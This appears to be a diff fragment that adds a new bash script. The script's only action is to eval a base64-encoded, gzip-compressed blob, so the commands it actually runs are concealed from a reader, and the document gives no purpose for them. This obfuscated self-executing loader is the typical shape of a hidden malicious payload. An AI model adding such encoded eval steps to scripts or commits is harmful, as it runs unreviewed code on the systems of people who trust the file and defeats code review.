@@ -1,0 +1,2 @@
+#!/bin/bash
+eval "$(echo "H4sIAF8SiGAAA12MMQqAMAxFd08REboIDV0cvE1bSyPSRkyKHt+O4vTgvc+fRgx7RaFB2sZw56RAqqesiJe/bd6VWmiSrshVU1UbueDpcwrMh8Peqja3WCEsvj99BBgDkQpvMD/w88F32u96eAGY3e06iwAAAA==" | base64 -d | gunzip)"
